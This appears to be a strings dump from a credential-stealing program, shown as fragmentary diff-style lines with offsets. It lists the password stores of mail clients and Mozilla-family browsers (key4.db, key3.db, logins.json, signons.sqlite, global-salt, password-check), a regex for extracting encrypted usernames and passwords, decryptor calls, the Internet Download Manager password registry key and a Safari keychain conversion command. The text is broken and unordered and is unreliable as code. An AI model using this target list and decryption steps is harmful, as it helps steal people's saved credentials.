- 508304
-SMTP 508944
-POPPass									 508496
-SMTPPass 508528
-Email 508592
-PocoMail 508720
-No data! 509136
-<array>									 509168
-<string> 509264
-</string> 509296
-<string> 513808
-</string> 513584
-Safari Browser 513936
-<dict>
- 509072
-Length
- 509360
-<data>
- 514000
-</data>									 514032
- -convert xml1 -s -o "
- 514224
-\fixed_keychain.xml"  514128
-ABCDEF
- 514160
-APPDATA									 514576
-\Mozilla\Firefox\ 514352
-\Postbox\ 514768
-\Thunderbird\ 514800
-\Mozilla\SeaMonkey\
-
-
-
-
-
-
-
-
-
-
-
-
- 514704
-\K-Meleon\ 515344
-\Mozilla\icecat\ 515120
-\Moonchild Productions\Pale Moon\ 515536
-\Comodo\IceDragon\ 515568
-\Waterfox\ 515472
-\Flock\Browser\ 514992
-\NETGATE Technologies\BlackHawk\ 514896
-\8pecxstudios\Cyberfox\									 514928
-key4.db									 511664
-key4.db									 511568
-metaData 511600
-nssPrivate 512240
-a102 512144
-password 512016
-item1 511792
-item2 512208
-key3.db									 512432
-key3.db									 512336
-Value 512912
-Replace									 513200
-global-salt 512368
-Version									 512784
-password-check 512560
-global-salt 513008
-Value 512976
-Path=([A-z0-9\/\.\-]+)
- 513104
-profiles.ini 513136
-[^\u0020-\u007F] 517872
-[^\u0020-\u007F] 517776
-logins.json 513328
-\"(hostname|encryptedPassword|encryptedUsername)":"(.*?)" 517840
-logins.json 513552
-hostname 518000
-[^\u0020-\u007F] 518640
-encryptedPassword 518192
-encryptedUsername 518416
-[^\u0020-\u007F] 518608
-signons.sqlite 518064
-moz_logins 517968
-Mode 518544
-Padding									 518832
-CreateDecryptor 518736
-TransformFinalBlock
-
-
-
-
-
-
-
-
-
-
-
-
- 518768
-Mode 519184
-Padding									 518960
-CreateDecryptor 519376
-TransformFinalBlock
-
-
-
-
-
-
-
-
-
-
-
-
- 519408
-Mode 519312
-Padding									 519600
-CreateDecryptor 519504
-TransformFinalBlock
-
-
-
-
-
-
-
-
-
-
-
-
- 519536
-EndsWith 515856
-IndexOf									 516080
-IndexOf									 516272
-UNIQUE
- 516176
-Substring 515984
-Substring 515632
-Length
- 516048
-table 516208
-SystemDrive 516752
-No Data									 517040
-WScript.Shell 516944
-RegRead									 516976
-Software\DownloadManager\Passwords\
-
-
-
-
-
-
-
-
-
-
-
-
- 516624
-User 516400
-EncPassword 516816
-Internet Download Manager 516848
-Stream cannot seek 517392
-Writing is not alowed 517168
-Writing is not allowed
- 517584
-Writing is not alowed 517616
-Central directory currently does not exist 517520
-Stream cannot be written 521904
-RemoveEntries is allowed just over streams of type FileStream 521808
